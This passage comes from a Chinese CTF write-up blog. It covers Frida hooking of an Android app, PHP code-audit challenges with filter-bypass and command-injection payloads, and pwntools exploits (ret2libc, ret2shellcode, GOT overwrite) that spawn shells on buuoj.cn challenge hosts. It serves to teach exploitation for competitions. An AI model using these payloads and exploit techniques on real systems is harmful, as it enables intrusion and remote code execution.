com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity</span><br></pre></td></tr></table></figure><p>查看我们启动控件的PID</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hungs&gt;frida-ps -aU</span><br><span class="line">  PID  Name             Identifier</span><br><span class="line">-----  ---------------  ---------------------------------------</span><br><span class="line">10738  Activity_Travel  com.droidlearn.activity_travel</span><br><span class="line"> 9870  Android Auto     com.google.android.projection.gearhead</span><br><span class="line">23407  Google           com.google.android.googlequicksearchbox</span><br><span class="line"> 9063  Google Play 商店   com.android.vending</span><br><span class="line"> 9022  Google Play 电影   com.google.android.videos</span><br><span class="line">11206  Magisk           com.topjohnwu.magisk</span><br></pre></td></tr></table></figure><p>接着我们就是 attach 上了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">10738</span>)</span><br></pre></td></tr></table></figure><p>接着可以编写我们的 js 脚本用来重写要hook的类方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">    <span class="comment">//在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>接着让我们的 js 脚本加载到该目标进程上即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接安卓机上的frida-servr</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">10738</span>)</span><br><span class="line"><span class="comment"># 加载hooook.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hooook.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"><span class="comment"># 脚本会持续运行等待输入</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>运行脚本，再点击 CLICK ME 即可！</p><p>GetFlag!</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>前4题和最后一题不说，不难。</p><h2 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php代码审计。</p><ul><li><p>第一层要求将参数data所带的字符串为Welcome to CTF。</p><p>用data://伪协议传入数据流绕过。</p></li><li><p>第二层要求<code>md5($_GET[&#39;key1&#39;]) === md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;]</code></p><p>MD5强比较，那么用数组绕过，md5()函数无法处理数组，如果传入的为数组，会返回NULL。== 弱比较可用科学计数法绕过。参考文章：<a href="https://mochu.blog.csdn.net/article/details/114494427">(65条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初mochu7的博客-CSDN博客</a></p></li><li><p>第三层<code>!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) == 2077</code></p><p>is_numeric()判断是不是数字或数字字符串，intval() 函数用于获取变量的整数值，可以使用2077a，2077%00，2077%0a绕过</p></li><li><p>第四层<code>eval(&quot;#&quot;.$_GET[&#39;cmd&#39;]);</code></p><p>.拼接字符串，#后的被注释了，可以用%0a换行绕过，或者?&gt;闭合。</p></li></ul><p>即可得到flag。</p><h2 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单写个脚本，可以看到这些字符没被过滤。<br><img src="https://s2.loli.net/2023/08/04/sbVnF3KArw1dCTJ.png" alt="image-20221026100324165.png"><br>利用<code>cd</code>切换目录，<code>&amp;&amp;</code>执行多条，<code>$@</code>绕过关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">cd</span>%09..%26%26cd%09..%26%26cd%09..%26%26ls</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/d9S8tumhjGvMnEw.png" alt="image-20221026101033075.png"><br>playload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">cd</span>%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca<span class="variable">$@t</span>%09ffff<span class="variable">$@llllaaaaggggg</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/NmjUk8GKHOI7Zf4.png" alt="image-20221026101433108.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29527</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x08</span>) + p64(<span class="number">0x400708</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29946</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;answer?&#x27;</span>)</span><br><span class="line">    n = p.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    question = n.strip().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> question:</span><br><span class="line">        question = question.replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    answer = <span class="built_in">str</span>(<span class="built_in">eval</span>(question))</span><br><span class="line">    p.sendline(answer)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28197</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x0000000000400753</span></span><br><span class="line">main = <span class="number">0x400698</span></span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x08</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">  </span><br><span class="line">puts_offset = <span class="number">0x84420</span></span><br><span class="line">execve = <span class="number">0xe3afe</span></span><br><span class="line">pop = <span class="number">0x000000000040074c</span></span><br><span class="line">  </span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">execve_addr = libc_addr + execve</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x08</span>) + p64(pop) + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(execve_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;time?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">&#x27;./shell&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">remote_libc = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"><span class="comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    r = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25903</span> )</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line">elf = ELF(local_file)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line"><span class="comment">#-----------------------------</span></span><br><span class="line">sla(<span class="string">&#x27;Hello my friend.Any gift for me?\n&#x27;</span>,asm(shellcraft.sh()))</span><br><span class="line">sla(<span class="string">&#x27;Anything else?\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x233000</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="fallw1nd’s-gift"><a href="#fallw1nd’s-gift" class="headerlink" title="fallw1nd’s gift"></a>fallw1nd’s gift</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">&#x27;./fallw1nd_gift&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">remote_libc = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"><span class="comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    r = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25419</span>)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line">elf = ELF(local_file)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims                         :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr        :r.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">     gdb.attach(r,cmd)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line">ru(<span class="string">&#x27;gift as reward:\n&#x27;</span>)</span><br><span class="line">puts_got=<span class="built_in">eval</span>(rc(<span class="number">14</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_got)</span><br><span class="line">base=puts_got-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(base)</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">puts_plt=base+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&#x27;now input your addr:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">0x4033f8</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">se(p64(system))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> NewstartCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF 2022 Web-Writeup</title>
      <link href="/posts/cbb4.html"/>
      <url>/posts/cbb4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php弱类型比较。传入ISCTF=114514a即可。</p><p>这里用到了PHP弱比较的知识</p><blockquote><p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。<br>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p></blockquote><h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p>打开链接一看很快就重定向到别的网站了，抓包看看。</p><p><img src="https://s2.loli.net/2023/08/04/7YtpVsFUvSw2zAH.png" alt="image-20221105093638578.png"></p><p>看到一个奇怪的If-None-Match和ETag，补充下知识点：</p><p>ETag是HTTP1.1中才加入的一个属性，用来帮助服务器控制Web端的缓存验证。</p><blockquote><p>它的原理是这样的，当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag返回给浏览器，浏览器把”3f80f-1b6-3e1cb03b” 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b”的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。</p></blockquote><p>大概意思是比较If-None-Match和ETag，如果两者不相等则重新返回资源，否则不返回。</p><p>我们将If-None-Match修改之后再发包。就得到了flag。</p><p><img src="https://s2.loli.net/2023/08/04/uC483KqpvROMIE5.png" alt="image-20221105093946826.png"></p><p>应该是个非预期吧，在sitemap里能看到burp爬过的记录，里面也能看到flag。</p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span 